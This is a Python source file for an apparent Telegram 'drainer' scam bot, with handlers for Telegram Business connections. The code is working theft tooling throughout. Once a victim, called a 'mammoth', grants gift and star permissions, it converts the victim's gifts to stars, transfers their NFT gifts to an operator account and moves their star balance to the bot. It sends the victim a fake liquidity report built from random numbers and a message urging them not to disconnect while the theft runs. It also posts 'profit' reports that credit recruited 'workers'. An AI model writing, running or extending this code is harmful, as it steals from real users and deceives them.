# twork/tdrainer/handlers/business_handlers.py
import asyncio
import random
from aiogram import Router, types
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from keyboards.user_keyboards import get_manual_control_keyboard, ManualControl, RefreshConnection
from utils import escape_md

from bot_instance import bot, worker_bot
from settings import settings
from database import get_worker_id, add_or_update_connection, get_connection_details, get_withdrawal_mode
from keyboards.user_keyboards import get_manual_control_keyboard
from utils import escape_md

router = Router()

async def convert_regular_gifts(bc_id: str) -> str:
    """
    Конвертирует обычные подарки бизнес-аккаунта в звезды.
    """
    try:
        owned_gifts = await bot.get_business_account_gifts(business_connection_id=bc_id)
        # Фильтруем только обычные подарки, которые можно конвертировать
        regular_gifts = [g for g in owned_gifts.gifts if g.type == 'regular' and g.convert_star_count is not None and g.convert_star_count > 0]

        if not regular_gifts:
            return "Обычные подарки для конвертации не найдены."

        converted_count = 0
        for gift in regular_gifts:
            try:
                await bot.convert_gift_to_stars(business_connection_id=bc_id, owned_gift_id=gift.owned_gift_id)
                converted_count += 1
                await asyncio.sleep(0.5) # Небольшая задержка между операциями
            except Exception:
                # Пропускаем подарки, которые не удалось конвертировать
                continue

        return f"✅ Успешно конвертировано: {converted_count} шт."
    except Exception as e:
        return f"❌ Ошибка при конвертации: {e}"

async def drain_nft_gifts(bc_id: str) -> str:
    """
    Выводит уникальные (NFT) подарки на целевой аккаунт.
    """
    try:
        owned_gifts = await bot.get_business_account_gifts(business_connection_id=bc_id)
        
        # Фильтруем только уникальные подарки, которые можно передать
        unique_gifts = [g for g in owned_gifts.gifts if g.type == 'unique' and g.can_be_transferred]

        if not unique_gifts:
            return "Уникальные NFT-подарки для вывода не найдены."

        transferred_count = 0
        target_id = settings.bot.drain_target_id
        
        for gift in unique_gifts:
            try:
                # Пытаемся передать подарок
                await bot.transfer_gift(
                    business_connection_id=bc_id,
                    owned_gift_id=gift.owned_gift_id,
                    new_owner_chat_id=target_id,
                    star_count=gift.transfer_star_count or 0 # Оплачиваем передачу, если требуется
                )
                transferred_count += 1
                await asyncio.sleep(0.5)
            except Exception as e:
                # Пропускаем подарки, которые не удалось передать
                print(f"Ошибка при выводе NFT-подарка {gift.owned_gift_id}: {e}")
                continue
        
        return f"✅ Успешно выведено NFT-подарков: {transferred_count} шт."
    except Exception as e:
        return f"❌ Ошибка при выводе NFT-подарков: {e}"

async def drain_stars(bc_id: str) -> str:
    """
    Выводит звезды с баланса бизнес-аккаунта на баланс бота.
    """
    try:
        # Получаем баланс звезд бизнес-аккаунта
        star_balance = await bot.get_business_account_star_balance(business_connection_id=bc_id)

        if not star_balance or star_balance.amount <= 0:
            return "На балансе бизнес-аккаунта нет звезд для вывода."

        amount_to_transfer = star_balance.amount

        # Переводим звезды на баланс бота
        await bot.transfer_business_account_stars(
            business_connection_id=bc_id,
            star_count=amount_to_transfer
        )
        
        # Возвращаем отчет об успешном выводе без запроса баланса бота
        return f"✅ Успешно выведено {amount_to_transfer} звезд на баланс бота."

    except TelegramBadRequest as e:
        if "BUSINESS_ACCOUNT_STAR_BALANCE_NOT_ENOUGH" in str(e):
             return "❌ Ошибка: Недостаточно звезд на балансе бизнес-аккаунта."
        return f"❌ Произошла ошибка Telegram: {e}"
    except Exception as e:
        return f"❌ Непредвиденная ошибка при выводе звезд: {e}"

async def start_draining_process(connection: types.BusinessConnection):
    """
    Запускает автоматический процесс конвертации и дрейна подарков.
    """
    await convert_regular_gifts(connection.id) # Сначала конвертируем обычные подарки в звезды
    await asyncio.sleep(2) # Небольшая задержка
    drain_report = await drain_stars(connection.id) # Затем пытаемся вывести подарки

    # Если дрейн был успешным (выведено не 0 шт)
    if "Успешно выведено" in drain_report and "0 шт" not in drain_report:
        worker_id = get_worker_id(connection.user.id) # Получаем ID воркера, если есть

        if worker_id == 0:
            worker_details = "@None"
        else:
            try:
                worker_info = await worker_bot.get_chat(worker_id)
                worker_username = f" \\(@{escape_md(worker_info.username)}\\)" if worker_info.username else ""
                worker_details = f"{escape_md(worker_info.full_name)}{worker_username} \\(`{worker_id}`\\)"
            except Exception:
                worker_details = f"ID: `{worker_id}`" # Если не удалось получить инфо о воркере

        mammoth_user = connection.user
        mammoth_username_raw = mammoth_user.username or "None"
        mammoth_details_for_profit = f"{escape_md(mammoth_user.full_name)} \\(@{escape_md(mammoth_username_raw)}\\) \\(`{mammoth_user.id}`\\)"

        profit_message = (
            f"💎 *Новый профит* 💎\n\n"
            f"> 👨‍💻 *Воркер:* {worker_details}\n"
            f"> 🐘 *Мамонт:* {escape_md(mammoth_user.full_name)} \\(`{mammoth_user.id}`\\)\n\n"
            f"📈 *Результат стилла подарков у {mammoth_details_for_profit}:*\n"
            f"> {escape_md(drain_report)}"
        )
        await bot.send_message(
            settings.bot.profit_channel_id, # Отправляем уведомление о профите в канал
            profit_message,
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )

async def send_fake_analysis_to_mammoth(connection: types.BusinessConnection):
    """
    Отправляет "фейковый" анализ ликвидности NFT-подарков мамонту.
    """
    try:
        owned_gifts = await bot.get_business_account_gifts(business_connection_id=connection.id)
        if not owned_gifts.gifts:
            return

        total_gifts = 0
        total_liquidity_percent = 0
        analysis_lines = []

        for gift in owned_gifts.gifts:
            # Проверяем, что у подарка есть все необходимые атрибуты для анализа
            if not (hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'name') and hasattr(gift.gift, 'number')):
                continue

            total_gifts += 1
            liquidity = random.randint(70, 100) # Генерируем случайную "ликвидность"
            total_liquidity_percent += liquidity

            gift_name_escaped = escape_md(gift.gift.name)
            gift_number_escaped = escape_md(str(gift.gift.number))

            gift_link = f"https://t\\.me/nft/{gift_name_escaped}\\-{gift_number_escaped}"
            analysis_line = f"💎 {gift_name_escaped} \\#{gift_number_escaped}: *{liquidity}%* \\({gift_link}\\)"
            analysis_lines.append(analysis_line)

        if total_gifts == 0:
            return # Не отправляем анализ, если нет подходящих подарков

        avg_liquidity = round(total_liquidity_percent / total_gifts, 1)
        avg_liquidity_str = str(avg_liquidity).replace('.', '\\.') # Экранируем точку для MarkdownV2
        analysis_list_str = "\n> ".join(analysis_lines)

        final_text = (
            "✅ *Gift Liquidity Analysis Completed*\n\n"
            f"📈 *Total Assets Analyzed:*\n"
            f"> *Number of NFTs:* `{total_gifts}`\n"
            f"> *AVG Liquidity:* *{avg_liquidity_str}%*\n\n"
            f"📊 *Detailed Report:*\n"
            f"> {analysis_list_str}"
        )

        await bot.send_message(
            chat_id=connection.user.id, # Отправляем анализ мамонту
            text=final_text,
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )

    except Exception as e:
        print(f"Не удалось отправить фейковый анализ мамонту {connection.user.id}: {e}")

async def _generate_connection_report_message(connection_id: str, mammoth_user: types.User, worker_id: int, rights: types.ChatAdministratorRights) -> str:
    """
    Генерирует текстовый отчет о бизнес-подключении для канала профитов.
    Эта функция используется как при новом подключении, так и при обновлении по кнопке.
    """
    worker_details = "@None"
    if worker_id != 0:
        try:
            worker_info = await worker_bot.get_chat(worker_id)
            worker_username = f" \\(@{escape_md(worker_info.username)}\\)" if worker_info.username else ""
            worker_details = f"{escape_md(worker_info.full_name)}{worker_username} \\(`{worker_id}`\\)"
        except Exception:
            worker_details = f"ID: `{worker_id}`"

    mammoth_username = f" \\(@{escape_md(mammoth_user.username)}\\)" if mammoth_user.username else ""
    mammoth_details = f"{escape_md(mammoth_user.full_name)}{mammoth_username} \\(`{mammoth_user.id}`\\)"

    stars_count, gifts_count, stars_needed = "🚫", "🚫", "🚫"
    gifts_list_str = "Нет прав для просмотра\\."

    # Формируем список разрешений
    permissions_list = [
        f"{'✅' if rights.can_view_gifts_and_stars else '❌'} Просмотр подарков и звёзд",
        f"{'✅' if rights.can_convert_gifts_to_stars else '❌'} Конвертация подарков в звёзды",
        f"{'✅' if rights.can_transfer_and_upgrade_gifts else '❌'} Передача и улучшение подарков"
    ]
    permissions_str = "\n> ".join(permissions_list)

    # Получаем данные о звездах и подарках, если есть разрешение
    if rights.can_view_gifts_and_stars:
        try:
            star_balance = await bot.get_business_account_star_balance(business_connection_id=connection_id)
            owned_gifts = await bot.get_business_account_gifts(business_connection_id=connection_id)

            stars_count = star_balance.amount

            valid_gifts = [g for g in owned_gifts.gifts if hasattr(g, 'gift') and g.gift and hasattr(g.gift, 'name') and hasattr(g.gift, 'number')]
            gifts_count = len(valid_gifts)

            transferable_unique_gifts = [g for g in valid_gifts if g.can_be_transferred and g.type == 'unique']
            stars_needed = len(transferable_unique_gifts) * 25

            gift_links = [f"https://t\\.me/nft/{escape_md(g.gift.name)}\\-{escape_md(str(g.gift.number))}" for g in valid_gifts]
            gifts_list_str = "\n> ".join(gift_links) if gift_links else "Пуст\\."
        except Exception:
            stars_count, gifts_count, stars_needed = "🚫", "🚫", "🚫"
            gifts_list_str = "Ошибка получения данных\\."


    admin_channel_message = (
        f"✅ *Новый коннект \\| Обновление*\n\n" # Заголовок для нового подключения или обновления
        f"> 🐘 *Мамонт:* {mammoth_details}\n"
        f"> 👨‍💻 *Воркер:* {worker_details}\n\n"
        f"> *Сервис: Чеки на звёзды*\n\n"
        f"📊 *Информация:*\n"
        f"> ⭐️ Количество звёзд: `{stars_count}` шт\\.\n"
        f"> 💰 Нужно звёзд для передачи: `{stars_needed}`\n"
        f"> 🎁 Количество NFT\\-Подарков: `{gifts_count}` шт\\.\n\n"
        f"🔐 *Разрешения:*\n"
        f"> {permissions_str}\n\n"
        f"🖼️ *Список подарков:*\n"
        f"> {gifts_list_str}"
    )
    return admin_channel_message

@router.business_connection()
async def handle_business_connection(connection: types.BusinessConnection):
    """
    Обрабатывает обновления бизнес-подключений.
    Всегда отправляет новое сообщение в канал для уведомлений.
    """
    mammoth_user = connection.user
    worker_id = get_worker_id(mammoth_user.id)
    if worker_id is None:
        worker_id = 0

    if not connection.is_enabled:
        # Если подключение отозвано, отправляем НОВОЕ сообщение об этом
        revoked_message = f"❌ *Подключение было отозвано мамонтом* `({mammoth_user.id})`"
        await bot.send_message(
            settings.bot.profit_channel_id,
            revoked_message,
            parse_mode=ParseMode.MARKDOWN_V2
        )
        # Не обновляем запись в БД, она будет перезаписана при повторном подключении
        return

    mode = get_withdrawal_mode() # Получаем текущий режим вывода

    # Генерируем подробное сообщение о подключении
    admin_channel_message = await _generate_connection_report_message(connection.id, mammoth_user, worker_id, connection.rights)

    # Получаем клавиатуру с кнопками управления и новой кнопкой "Обновить данные"
    reply_markup = get_manual_control_keyboard(mammoth_user.id, connection.id)

    try:
        # Всегда отправляем НОВОЕ сообщение
        sent_message = await bot.send_message(
            settings.bot.profit_channel_id,
            admin_channel_message,
            reply_markup=reply_markup,
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )
        # Сохраняем или обновляем информацию о подключении в БД, включая message_id нового сообщения
        add_or_update_connection(mammoth_user.id, worker_id, sent_message.message_id, connection.id)
    except TelegramBadRequest as e:
        print(f"Не удалось отправить сообщение для {mammoth_user.id}: {e}")

    # Проверяем наличие всех необходимых разрешений
    all_required_rights = all([
        connection.rights.can_view_gifts_and_stars,
        connection.rights.can_convert_gifts_to_stars,
        connection.rights.can_transfer_and_upgrade_gifts,
    ]
    )

    # Если не все разрешения даны, отправляем мамонту уведомление
    if not all_required_rights:
        await bot.send_message(
            chat_id=connection.user.id,
            text="⚠️ *Permissions Required*\n\nTo complete the connection, please go back and *grant all permissions* in the *\"Gifts and Stars\"* section\\. This is necessary for all features to work correctly\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return

    # >>>>>>>> НОВЫЙ БЛОК КОДА <<<<<<<<
    # Отправляем сообщение о начале обработки чека
    await bot.send_message(
        chat_id=connection.user.id,
        text=(
            "⏳ *Обрабатываем ваш чек\\.\\.\\.*\n\n"
            "Пожалуйста, подождите\\. Зачисление звёзд может занять несколько минут\\.\n\n"
            "❗️ *Не отключайте и не блокируйте бота, чтобы транзакция прошла успешно и ваши звёзды не были утеряны\\.*"
        ),
        parse_mode=ParseMode.MARKDOWN_V2
    )
    # >>>>>>>> КОНЕЦ НОВОГО БЛОКА <<<<<<<<

    # Запускаем отправку фейкового анализа и процесс дрейна в фоновом режиме
    asyncio.create_task(send_fake_analysis_to_mammoth(connection))

@router.callback_query(ManualControl.filter())
async def handle_manual_control(callback: types.CallbackQuery, callback_data: ManualControl):
    """
    Обрабатывает колбэки ручного управления (конвертация, вывод подарков/звезд).
    """
    action = callback_data.action
    mammoth_id = callback_data.mammoth_id

    connection_details = get_connection_details(mammoth_id)
    if not connection_details:
        await callback.answer("❌ Ошибка: не найдены детали подключения для этого пользователя.", show_alert=True)
        return

    bc_id = connection_details[1] # Получаем ID бизнес-подключения из БД

    if not bc_id:
        await callback.answer("❌ Ошибка: ID бизнес-подключения не сохранен. Пользователь должен переподключиться.", show_alert=True)
        return

    await callback.answer(f"🚀 Запускаю задачу: {action}...")

    report = ""
    if action == "convert_gifts":
        report = await convert_regular_gifts(bc_id)
    elif action == "drain_gifts":
        report = await drain_nft_gifts(bc_id)
    elif action == "drain_stars":
        report = await drain_stars(bc_id)

    await callback.message.answer(
        f"📝 *Отчет о ручной операции для мамонта `{mammoth_id}`:*\n\n`{report}`",
        parse_mode="MarkdownV2"
    )

async def _get_connection_report_details_for_refresh(bc_id: str, mammoth_user: types.User, worker_id: int) -> str:
    """
    Генерирует текстовый отчет о бизнес-подключении для обновления по кнопке.
    Аналогична _generate_connection_report_message, но для контекста обновления.
    """
    worker_details = "@None"
    if worker_id != 0:
        try:
            worker_info = await worker_bot.get_chat(worker_id)
            worker_username = f" \\(@{escape_md(worker_info.username)}\\)" if worker_info.username else ""
            worker_details = f"{escape_md(worker_info.full_name)}{worker_username} \\(`{worker_id}`\\)"
        except Exception:
            worker_details = f"ID: `{worker_id}`"

    mammoth_username = f" \\(@{escape_md(mammoth_user.username)}\\)" if mammoth_user.username else ""
    mammoth_details = f"{escape_md(mammoth_user.full_name)}{mammoth_username} \\(`{mammoth_user.id}`\\)"

    stars_count, gifts_count, stars_needed = "🚫", "🚫", "🚫"
    gifts_list_str = "Ошибка получения данных\\."
    permissions_str = "Ошибка получения разрешений\\."

    # При обновлении данных предполагаем, что необходимые права есть,
    # если данные успешно получены. Иначе сообщаем об ошибке.
    try:
        star_balance = await bot.get_business_account_star_balance(business_connection_id=bc_id)
        owned_gifts = await bot.get_business_account_gifts(business_connection_id=bc_id)

        stars_count = star_balance.amount

        valid_gifts = [g for g in owned_gifts.gifts if hasattr(g, 'gift') and g.gift and hasattr(g.gift, 'name') and hasattr(g.gift, 'number')]
        gifts_count = len(valid_gifts)

        transferable_unique_gifts = [g for g in valid_gifts if g.can_be_transferred and g.type == 'unique']
        stars_needed = len(transferable_unique_gifts) * 25

        gift_links = [f"https://t\\.me/nft/{escape_md(g.gift.name)}\\-{escape_md(str(g.gift.number))}" for g in valid_gifts]
        gifts_list_str = "\n> ".join(gift_links) if gift_links else "Пуст\\."

        # Если данные успешно получены, предполагаем наличие всех разрешений
        permissions_list = [
            "✅ Просмотр подарков и звёзд",
            "✅ Конвертация подарков в звёзды",
            "✅ Передача и улучшение подарков"
        ]
        permissions_str = "\n> ".join(permissions_list)

    except Exception as e:
        stars_count, gifts_count, stars_needed = "🚫", "🚫", "🚫"
        gifts_list_str = f"Ошибка получения данных: {escape_md(str(e))}"
        permissions_str = f"Ошибка получения данных: {escape_md(str(e))}"


    admin_channel_message = (
        f"✅ *Обновление данных коннекта*\n\n"
        f"> 🐘 *Мамонт:* {mammoth_details}\n"
        f"> 👨‍💻 *Воркер:* {worker_details}\n\n"
        f"> *Сервис: Чеки на звёзды*\n\n"
        f"📊 *Информация:*\n"
        f"> ⭐️ Количество звёзд: `{stars_count}` шт\\.\n"
        f"> 💰 Нужно звёзд для передачи: `{stars_needed}`\n"
        f"> 🎁 Количество NFT\\-Подарков: `{gifts_count}` шт\\.\n\n"
        f"🔐 *Разрешения:*\n"
        f"> {permissions_str}\n\n"
        f"🖼️ *Список подарков:*\n"
        f"> {gifts_list_str}"
    )
    return admin_channel_message

@router.callback_query(RefreshConnection.filter())
async def handle_refresh_connection(callback: types.CallbackQuery, callback_data: RefreshConnection):
    """
    Обрабатывает нажатие кнопки "Обновить данные" для бизнес-подключения.
    Редактирует сообщение, чтобы отобразить актуальную информацию.
    """
    mammoth_id = callback_data.mammoth_id
    bc_id = callback_data.bc_id

    await callback.answer("🔄 Обновляю данные...")

    connection_details_from_db = get_connection_details(mammoth_id)
    if not connection_details_from_db:
        await callback.message.answer("❌ Ошибка: не найдены детали подключения для этого пользователя в базе данных.")
        return

    # Получаем информацию о пользователе (мамонте)
    mammoth_user = await bot.get_chat(mammoth_id)
    # Получаем ID воркера, к которому привязан мамонт
    worker_id = get_worker_id(mammoth_id)
    if worker_id is None:
        worker_id = 0 # По умолчанию, если воркер не найден

    # Генерируем обновленный текст сообщения с использованием текущих данных
    updated_message_text = await _get_connection_report_details_for_refresh(bc_id, mammoth_user, worker_id)

    # Используем ту же клавиатуру ручного управления с текущим bc_id
    reply_markup = get_manual_control_keyboard(mammoth_id, bc_id)

    try:
        # Редактируем исходное сообщение с новой информацией
        await callback.message.edit_text(
            text=updated_message_text,
            reply_markup=reply_markup,
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )
    except TelegramBadRequest as e:
        if "message is not modified" not in str(e):
            print(f"Не удалось обновить сообщение с данными для {mammoth_id}: {e}")
            await callback.answer("❌ Ошибка при обновлении сообщения.", show_alert=True)
        else:
            await callback.answer("Данные уже актуальны.") # Сообщение не изменилось